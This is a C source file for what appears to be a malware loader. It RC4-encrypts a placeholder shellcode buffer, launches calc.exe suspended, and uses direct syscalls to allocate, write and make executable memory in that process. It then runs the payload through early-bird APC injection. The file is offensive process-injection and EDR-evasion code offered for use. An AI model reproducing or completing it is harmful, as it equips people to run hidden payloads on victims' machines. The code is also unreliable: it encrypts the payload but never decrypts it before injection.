#include <windows.h>
#include <stdio.h>
#include "ProcessCreation.h"
#include "PayloadInjection.h"
#include "RC4Encryption.h"
#include "Syscalls.h"

int main() {
    DWORD processId;
    HANDLE hProcess, hThread;
    SyscallStruct St;

    // Initialize syscalls
    if (!InitializeSyscallStruct(&St)) {
        printf("[!] Could Not Initialize Syscalls\n");
        return -1;
    }

    // Step 1: Define the payload and RC4 encryption key
    printf("[*] Defining payload and encryption key...\n");
    unsigned char payload[] = {
        0x90, 0x90, 0x90, /* shellcode here */
    };
    unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key

    // Step 2: Encrypt the payload using RC4
    printf("[*] Encrypting payload with RC4...\n");
    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));
    printf("[+] Payload encrypted successfully.\n");

    // Step 3: Create a suspended process
    printf("[*] Creating a suspended process (calc.exe)...\n");
    if (!CreateSuspendedProcess("calc.exe", &processId, &hProcess, &hThread)) {
        printf("[!] Failed to create process.\n");
        return -1;
    }
    printf("[+] Process created successfully with PID: %d.\n", processId);

    // Step 4: Allocate memory in the target process using syscalls
    PVOID pBaseAddress = NULL;
    SIZE_T regionSize = sizeof(payload);
    NTSTATUS status = St.NtAllocateVirtualMemory(hProcess, &pBaseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("[!] NtAllocateVirtualMemory failed with error: 0x%08X\n", status);
        return -1;
    }
    printf("[+] Memory allocated at 0x%p.\n", pBaseAddress);

    // Step 5: Write the payload into the allocated memory
    SIZE_T writtenBytes = 0;
    status = St.NtWriteVirtualMemory(hProcess, pBaseAddress, payload, sizeof(payload), &writtenBytes);
    if (status != 0 || writtenBytes != sizeof(payload)) {
        printf("[!] NtWriteVirtualMemory failed with error: 0x%08X\n", status);
        return -1;
    }
    printf("[+] Payload written successfully.\n");

    // Step 6: Change memory protection to executable
    ULONG oldProtect;
    status = St.NtProtectVirtualMemory(hProcess, &pBaseAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (status != 0) {
        printf("[!] NtProtectVirtualMemory failed with error: 0x%08X\n", status);
        return -1;
    }
    printf("[+] Memory protection changed to executable.\n");

    // Step 7: Queue the payload for execution using APC injection
    printf("[*] Queuing the payload using NtQueueApcThread...\n");
    status = St.NtQueueApcThread(hThread, pBaseAddress, NULL, NULL, 0);  // The last parameter should be an ULONG, so using 0
    if (status != 0) {
        printf("[!] NtQueueApcThread failed with error: 0x%08X\n", status);
        return -1;
    }
    printf("[+] Payload successfully queued for APC injection.\n");

    // Step 8: Resume the thread to execute the payload
    printf("[*] Resuming the thread to execute the payload...\n");
    ResumeThread(hThread);
    printf("[+] Thread resumed, payload should now execute.\n");

    return 0;
}
